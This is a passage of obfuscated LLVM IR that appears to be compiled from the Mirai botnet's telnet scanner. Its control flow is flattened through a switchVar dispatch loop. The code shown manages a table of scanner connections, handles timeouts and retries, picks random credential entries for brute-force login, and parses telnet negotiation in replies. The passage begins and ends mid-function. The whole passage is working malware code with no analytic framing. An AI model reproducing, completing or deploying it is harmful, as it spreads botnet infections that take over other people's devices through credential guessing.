  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  %402 = load i16, i16* %401, align 4
  %403 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %404 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %403, i32 0, i32 5
  store i16 %402, i16* %404, align 8
  %405 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %405)
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  store i32 -990981712, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %5, i32 0, i32 0
  %409 = getelementptr inbounds [16 x i64], [16 x i64]* %408, i64 0, i64 0
  %410 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %409) #6, !srcloc !1
  %411 = extractvalue { i64, i64* } %410, 0
  %412 = extractvalue { i64, i64* } %410, 1
  %413 = trunc i64 %411 to i32
  store i32 %413, i32* %24, align 4
  %414 = ptrtoint i64* %412 to i64
  %415 = trunc i64 %414 to i32
  store i32 %415, i32* %25, align 4
  store i32 -328464679, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  store i32 555765680, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %6, i32 0, i32 0
  %419 = getelementptr inbounds [16 x i64], [16 x i64]* %418, i64 0, i64 0
  %420 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %419) #6, !srcloc !2
  %421 = extractvalue { i64, i64* } %420, 0
  %422 = extractvalue { i64, i64* } %420, 1
  %423 = trunc i64 %421 to i32
  store i32 %423, i32* %26, align 4
  %424 = ptrtoint i64* %422 to i64
  %425 = trunc i64 %424 to i32
  store i32 %425, i32* %27, align 4
  store i32 1721231834, i32* %switchVar
  br label %loopEnd

; <label>:426:                                    ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1990685355, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load i32, i32* %1, align 4
  %429 = icmp slt i32 %428, 256
  %430 = select i1 %429, i32 215955732, i32 -192489800
  store i32 %430, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %433 = load i32, i32* %1, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %432, i64 %434
  store %struct.scanner_connection* %435, %struct.scanner_connection** %7, align 8
  %436 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %437 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %436, i32 0, i32 3
  %438 = load i32, i32* %437, align 8
  %439 = icmp ugt i32 %438, 1
  %440 = select i1 %439, i32 30, i32 5
  store i32 %440, i32* %28, align 4
  %441 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %442 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %441, i32 0, i32 3
  %443 = load i32, i32* %442, align 8
  %444 = icmp ne i32 %443, 0
  %445 = select i1 %444, i32 -887655513, i32 642166309
  store i32 %445, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* @fake_time, align 4
  %448 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %449 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %448, i32 0, i32 2
  %450 = load i32, i32* %449, align 4
  %451 = sub i32 %447, %450
  %452 = load i32, i32* %28, align 4
  %453 = icmp ugt i32 %451, %452
  %454 = select i1 %453, i32 2094242863, i32 642166309
  store i32 %454, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %457 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %456, i32 0, i32 1
  %458 = load i32, i32* %457, align 8
  %459 = call i32 @close(i32 %458)
  %460 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %461 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %460, i32 0, i32 1
  store i32 -1, i32* %461, align 8
  %462 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %463 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %462, i32 0, i32 3
  %464 = load i32, i32* %463, align 8
  %465 = icmp ugt i32 %464, 2
  %466 = select i1 %465, i32 -2118036076, i32 1083821388
  store i32 %466, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %469 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %468, i32 0, i32 8
  %470 = load i8, i8* %469, align 8
  %471 = add i8 %470, 1
  store i8 %471, i8* %469, align 8
  %472 = zext i8 %471 to i32
  %473 = icmp eq i32 %472, 10
  %474 = select i1 %473, i32 -332069945, i32 -1332115090
  store i32 %474, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  %476 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %477 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %476, i32 0, i32 8
  store i8 0, i8* %477, align 8
  %478 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %479 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %478, i32 0, i32 3
  store i32 0, i32* %479, align 8
  store i32 -212189573, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %481)
  store i32 -212189573, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  store i32 1967637136, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  %484 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %485 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %484, i32 0, i32 8
  store i8 0, i8* %485, align 8
  %486 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %487 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %486, i32 0, i32 3
  store i32 0, i32* %487, align 8
  store i32 1967637136, i32* %switchVar
  br label %loopEnd

; <label>:488:                                    ; preds = %loopEntry
  store i32 1360509912, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %491 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %490, i32 0, i32 3
  %492 = load i32, i32* %491, align 8
  %493 = icmp eq i32 %492, 1
  %494 = select i1 %493, i32 -826571333, i32 268135530
  store i32 %494, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  %496 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %497 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %496, i32 0, i32 1
  %498 = load i32, i32* %497, align 8
  %499 = srem i32 %498, 64
  %500 = zext i32 %499 to i64
  %501 = shl i64 1, %500
  %502 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %6, i32 0, i32 0
  %503 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %504 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %503, i32 0, i32 1
  %505 = load i32, i32* %504, align 8
  %506 = sdiv i32 %505, 64
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds [16 x i64], [16 x i64]* %502, i64 0, i64 %507
  %509 = load i64, i64* %508, align 8
  %510 = or i64 %509, %501
  store i64 %510, i64* %508, align 8
  %511 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %512 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %511, i32 0, i32 1
  %513 = load i32, i32* %512, align 8
  %514 = load i32, i32* %12, align 4
  %515 = icmp sgt i32 %513, %514
  %516 = select i1 %515, i32 503141509, i32 1856915680
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  %518 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %519 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %518, i32 0, i32 1
  %520 = load i32, i32* %519, align 8
  store i32 %520, i32* %12, align 4
  store i32 1856915680, i32* %switchVar
  br label %loopEnd

; <label>:521:                                    ; preds = %loopEntry
  store i32 344067791, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %524 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %523, i32 0, i32 3
  %525 = load i32, i32* %524, align 8
  %526 = icmp ne i32 %525, 0
  %527 = select i1 %526, i32 90417301, i32 -502396068
  store i32 %527, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  %529 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %530 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %529, i32 0, i32 1
  %531 = load i32, i32* %530, align 8
  %532 = srem i32 %531, 64
  %533 = zext i32 %532 to i64
  %534 = shl i64 1, %533
  %535 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %5, i32 0, i32 0
  %536 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %537 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %536, i32 0, i32 1
  %538 = load i32, i32* %537, align 8
  %539 = sdiv i32 %538, 64
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds [16 x i64], [16 x i64]* %535, i64 0, i64 %540
  %542 = load i64, i64* %541, align 8
  %543 = or i64 %542, %534
  store i64 %543, i64* %541, align 8
  %544 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %545 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %544, i32 0, i32 1
  %546 = load i32, i32* %545, align 8
  %547 = load i32, i32* %11, align 4
  %548 = icmp sgt i32 %546, %547
  %549 = select i1 %548, i32 -1309396200, i32 -1690124736
  store i32 %549, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %552 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %551, i32 0, i32 1
  %553 = load i32, i32* %552, align 8
  store i32 %553, i32* %11, align 4
  store i32 -1690124736, i32* %switchVar
  br label %loopEnd

; <label>:554:                                    ; preds = %loopEntry
  store i32 -502396068, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  store i32 344067791, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  store i32 1360509912, i32* %switchVar
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  %558 = load i32, i32* %1, align 4
  %559 = add nsw i32 %558, 1
  store i32 %559, i32* %1, align 4
  store i32 -1990685355, i32* %switchVar
  br label %loopEnd

; <label>:560:                                    ; preds = %loopEntry
  %561 = getelementptr inbounds %struct.timeval.29, %struct.timeval.29* %8, i32 0, i32 1
  store i64 0, i64* %561, align 8
  %562 = getelementptr inbounds %struct.timeval.29, %struct.timeval.29* %8, i32 0, i32 0
  store i64 1, i64* %562, align 8
  %563 = load i32, i32* %12, align 4
  %564 = load i32, i32* %11, align 4
  %565 = icmp sgt i32 %563, %564
  %566 = select i1 %565, i32 -1543158883, i32 -1104367084
  store i32 %566, i32* %switchVar
  br label %loopEnd

; <label>:567:                                    ; preds = %loopEntry
  %568 = load i32, i32* %12, align 4
  store i32 360389995, i32* %switchVar
  store i32 %568, i32* %.reg2mem29
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = load i32, i32* %11, align 4
  store i32 360389995, i32* %switchVar
  store i32 %570, i32* %.reg2mem29
  br label %loopEnd

; <label>:571:                                    ; preds = %loopEntry
  %.reload30 = load i32, i32* %.reg2mem29
  %572 = add nsw i32 1, %.reload30
  %573 = call i32 @select(i32 %572, %struct.fd_set.28* %5, %struct.fd_set.28* %6, %struct.fd_set.28* null, %struct.timeval.29* %8)
  store i32 %573, i32* %13, align 4
  %574 = call i64 @time(i64* null) #6
  %575 = trunc i64 %574 to i32
  store i32 %575, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  store i32 954542516, i32* %switchVar
  br label %loopEnd

; <label>:576:                                    ; preds = %loopEntry
  %577 = load i32, i32* %1, align 4
  %578 = icmp slt i32 %577, 256
  %579 = select i1 %578, i32 1729716282, i32 -1794290560
  store i32 %579, i32* %switchVar
  br label %loopEnd

; <label>:580:                                    ; preds = %loopEntry
  %581 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %582 = load i32, i32* %1, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %581, i64 %583
  store %struct.scanner_connection* %584, %struct.scanner_connection** %7, align 8
  %585 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %586 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %585, i32 0, i32 1
  %587 = load i32, i32* %586, align 8
  %588 = icmp eq i32 %587, -1
  %589 = select i1 %588, i32 -790247993, i32 -2103221912
  store i32 %589, i32* %switchVar
  br label %loopEnd

; <label>:590:                                    ; preds = %loopEntry
  store i32 1191869318, i32* %switchVar
  br label %loopEnd

; <label>:591:                                    ; preds = %loopEntry
  %592 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %6, i32 0, i32 0
  %593 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %594 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %593, i32 0, i32 1
  %595 = load i32, i32* %594, align 8
  %596 = sdiv i32 %595, 64
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds [16 x i64], [16 x i64]* %592, i64 0, i64 %597
  %599 = load i64, i64* %598, align 8
  %600 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %601 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %600, i32 0, i32 1
  %602 = load i32, i32* %601, align 8
  %603 = srem i32 %602, 64
  %604 = zext i32 %603 to i64
  %605 = shl i64 1, %604
  %606 = and i64 %599, %605
  %607 = icmp ne i64 %606, 0
  %608 = select i1 %607, i32 1989618838, i32 184639498
  store i32 %608, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %610 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %611 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %610, i32 0, i32 1
  %612 = load i32, i32* %611, align 8
  %613 = bitcast i32* %29 to i8*
  %614 = call i32 @getsockopt(i32 %612, i32 1, i32 4, i8* %613, i32* %31) #6
  store i32 %614, i32* %30, align 4
  %615 = load i32, i32* %29, align 4
  %616 = icmp eq i32 %615, 0
  %617 = select i1 %616, i32 -934052134, i32 -854395206
  store i32 %617, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  %619 = load i32, i32* %30, align 4
  %620 = icmp eq i32 %619, 0
  %621 = select i1 %620, i32 -2091707671, i32 -854395206
  store i32 %621, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %624 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %623, i32 0, i32 3
  store i32 2, i32* %624, align 8
  %625 = call %struct.scanner_auth* @random_auth_entry()
  %626 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %627 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %626, i32 0, i32 0
  store %struct.scanner_auth* %625, %struct.scanner_auth** %627, align 8
  %628 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %629 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %628, i32 0, i32 6
  store i32 0, i32* %629, align 4
  store i32 209236366, i32* %switchVar
  br label %loopEnd

; <label>:630:                                    ; preds = %loopEntry
  %631 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %632 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %631, i32 0, i32 1
  %633 = load i32, i32* %632, align 8
  %634 = call i32 @close(i32 %633)
  %635 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %636 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %635, i32 0, i32 1
  store i32 -1, i32* %636, align 8
  %637 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %638 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %637, i32 0, i32 8
  store i8 0, i8* %638, align 8
  %639 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %640 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %639, i32 0, i32 3
  store i32 0, i32* %640, align 8
  store i32 1191869318, i32* %switchVar
  br label %loopEnd

; <label>:641:                                    ; preds = %loopEntry
  store i32 184639498, i32* %switchVar
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  %643 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %5, i32 0, i32 0
  %644 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %645 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %644, i32 0, i32 1
  %646 = load i32, i32* %645, align 8
  %647 = sdiv i32 %646, 64
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds [16 x i64], [16 x i64]* %643, i64 0, i64 %648
  %650 = load i64, i64* %649, align 8
  %651 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %652 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %651, i32 0, i32 1
  %653 = load i32, i32* %652, align 8
  %654 = srem i32 %653, 64
  %655 = zext i32 %654 to i64
  %656 = shl i64 1, %655
  %657 = and i64 %650, %656
  %658 = icmp ne i64 %657, 0
  %659 = select i1 %658, i32 1128218606, i32 -1925528720
  store i32 %659, i32* %switchVar
  br label %loopEnd

; <label>:660:                                    ; preds = %loopEntry
  store i32 -1094098438, i32* %switchVar
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  %662 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %663 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %662, i32 0, i32 3
  %664 = load i32, i32* %663, align 8
  %665 = icmp eq i32 %664, 0
  %666 = select i1 %665, i32 -1167939978, i32 -536179007
  store i32 %666, i32* %switchVar
  br label %loopEnd

; <label>:667:                                    ; preds = %loopEntry
  store i32 -286917029, i32* %switchVar
  br label %loopEnd

; <label>:668:                                    ; preds = %loopEntry
  %669 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %670 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %669, i32 0, i32 6
  %671 = load i32, i32* %670, align 4
  %672 = icmp eq i32 %671, 256
  %673 = select i1 %672, i32 307026221, i32 61275457
  store i32 %673, i32* %switchVar
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
  %675 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %676 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %675, i32 0, i32 7
  %677 = getelementptr inbounds [256 x i8], [256 x i8]* %676, i32 0, i32 0
  %678 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %679 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %678, i32 0, i32 7
  %680 = getelementptr inbounds [256 x i8], [256 x i8]* %679, i32 0, i32 0
  %681 = getelementptr inbounds i8, i8* %680, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %677, i8* %681, i64 192, i32 1, i1 false)
  %682 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %683 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %682, i32 0, i32 6
  %684 = load i32, i32* %683, align 4
  %685 = sub nsw i32 %684, 64
  store i32 %685, i32* %683, align 4
  store i32 61275457, i32* %switchVar
  br label %loopEnd

; <label>:686:                                    ; preds = %loopEntry
  %687 = call i32* @__errno_location() #7
  store i32 0, i32* %687, align 4
  %688 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %689 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %688, i32 0, i32 1
  %690 = load i32, i32* %689, align 8
  %691 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %692 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %691, i32 0, i32 7
  %693 = getelementptr inbounds [256 x i8], [256 x i8]* %692, i32 0, i32 0
  %694 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %695 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %694, i32 0, i32 6
  %696 = load i32, i32* %695, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds i8, i8* %693, i64 %697
  %699 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %700 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %699, i32 0, i32 6
  %701 = load i32, i32* %700, align 4
  %702 = sub nsw i32 256, %701
  %703 = call i32 @recv_strip_null(i32 %690, i8* %698, i32 %702, i32 16384)
  store i32 %703, i32* %32, align 4
  %704 = load i32, i32* %32, align 4
  %705 = icmp eq i32 %704, 0
  %706 = select i1 %705, i32 923063591, i32 2013327518
  store i32 %706, i32* %switchVar
  br label %loopEnd

; <label>:707:                                    ; preds = %loopEntry
  %708 = call i32* @__errno_location() #7
  store i32 104, i32* %708, align 4
  store i32 -1, i32* %32, align 4
  store i32 2013327518, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i32, i32* %32, align 4
  %711 = icmp eq i32 %710, -1
  %712 = select i1 %711, i32 -1120926068, i32 1715852690
  store i32 %712, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = call i32* @__errno_location() #7
  %715 = load i32, i32* %714, align 4
  %716 = icmp ne i32 %715, 11
  %717 = select i1 %716, i32 -779015754, i32 165195391
  store i32 %717, i32* %switchVar
  br label %loopEnd

; <label>:718:                                    ; preds = %loopEntry
  %719 = call i32* @__errno_location() #7
  %720 = load i32, i32* %719, align 4
  %721 = icmp ne i32 %720, 11
  %722 = select i1 %721, i32 1232073307, i32 165195391
  store i32 %722, i32* %switchVar
  br label %loopEnd

; <label>:723:                                    ; preds = %loopEntry
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %725 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %724, i32 0, i32 1
  %726 = load i32, i32* %725, align 8
  %727 = call i32 @close(i32 %726)
  %728 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %729 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %728, i32 0, i32 1
  store i32 -1, i32* %729, align 8
  %730 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %731 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %730, i32 0, i32 8
  %732 = load i8, i8* %731, align 8
  %733 = add i8 %732, 1
  store i8 %733, i8* %731, align 8
  %734 = zext i8 %733 to i32
  %735 = icmp sge i32 %734, 10
  %736 = select i1 %735, i32 -1198804465, i32 615336590
  store i32 %736, i32* %switchVar
  br label %loopEnd

; <label>:737:                                    ; preds = %loopEntry
  %738 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %739 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %738, i32 0, i32 8
  store i8 0, i8* %739, align 8
  %740 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %741 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %740, i32 0, i32 3
  store i32 0, i32* %741, align 8
  store i32 -662819355, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  %743 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %743)
  store i32 -662819355, i32* %switchVar
  br label %loopEnd

; <label>:744:                                    ; preds = %loopEntry
  store i32 165195391, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  store i32 -286917029, i32* %switchVar
  br label %loopEnd

; <label>:746:                                    ; preds = %loopEntry
  %747 = load i32, i32* %32, align 4
  %748 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %749 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %748, i32 0, i32 6
  %750 = load i32, i32* %749, align 4
  %751 = add nsw i32 %750, %747
  store i32 %751, i32* %749, align 4
  %752 = load i32, i32* @fake_time, align 4
  %753 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %754 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %753, i32 0, i32 2
  store i32 %752, i32* %754, align 4
  store i32 376739106, i32* %switchVar
  br label %loopEnd

; <label>:755:                                    ; preds = %loopEntry
  store i32 0, i32* %33, align 4
  %756 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %757 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %756, i32 0, i32 3
  %758 = load i32, i32* %757, align 8
  store i32 %758, i32* %.reg2mem18
  store i32 -675123517, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload28 = load volatile i32, i32* %.reg2mem18
  %Pivot16 = icmp slt i32 %.reload28, 6
  %759 = select i1 %Pivot16, i32 536000602, i32 -195771206
  store i32 %759, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload23 = load volatile i32, i32* %.reg2mem18
  %Pivot14 = icmp slt i32 %.reload23, 8
  %760 = select i1 %Pivot14, i32 -110687246, i32 -2134490730
  store i32 %760, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload21 = load volatile i32, i32* %.reg2mem18
  %Pivot12 = icmp slt i32 %.reload21, 9
  %761 = select i1 %Pivot12, i32 -1721006053, i32 1206897374
  store i32 %761, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload20 = load volatile i32, i32* %.reg2mem18
  %Pivot10 = icmp slt i32 %.reload20, 10
  %762 = select i1 %Pivot10, i32 -1160541541, i32 1916477772
  store i32 %762, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload19 = load volatile i32, i32* %.reg2mem18
  %SwitchLeaf8 = icmp eq i32 %.reload19, 10
  %763 = select i1 %SwitchLeaf8, i32 -177958160, i32 -1782213126
  store i32 %763, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload22 = load volatile i32, i32* %.reg2mem18
  %Pivot6 = icmp slt i32 %.reload22, 7
  %764 = select i1 %Pivot6, i32 519101774, i32 1985249213
  store i32 %764, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload27 = load volatile i32, i32* %.reg2mem18
  %Pivot4 = icmp slt i32 %.reload27, 4
  %765 = select i1 %Pivot4, i32 608756329, i32 -235214534
  store i32 %765, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload24 = load volatile i32, i32* %.reg2mem18
  %Pivot2 = icmp slt i32 %.reload24, 5
  %766 = select i1 %Pivot2, i32 500977345, i32 1385498856
  store i32 %766, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload26 = load volatile i32, i32* %.reg2mem18
  %Pivot = icmp slt i32 %.reload26, 3
  %767 = select i1 %Pivot, i32 807950514, i32 -1049058279
  store i32 %767, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload25 = load volatile i32, i32* %.reg2mem18
  %SwitchLeaf = icmp eq i32 %.reload25, 2
  %768 = select i1 %SwitchLeaf, i32 -919767250, i32 -1782213126
  store i32 %768, i32* %switchVar
  br label %loopEnd

; <label>:769:                                    ; preds = %loopEntry
  %770 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %771 = call i32 @consume_iacs(%struct.scanner_connection* %770)
  store i32 %771, i32* %33, align 4
  %772 = icmp sgt i32 %771, 0
  %773 = select i1 %772, i32 1281533134, i32 -1200963688
  store i32 %773, i32* %switchVar
  br label %loopEnd

; <label>:774:                                    ; preds = %loopEntry
  %775 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %776 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %775, i32 0, i32 3
  store i32 3, i32* %776, align 8
  store i32 -1200963688, i32* %switchVar
  br label %loopEnd

; <label>:777:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:778:                                    ; preds = %loopEntry
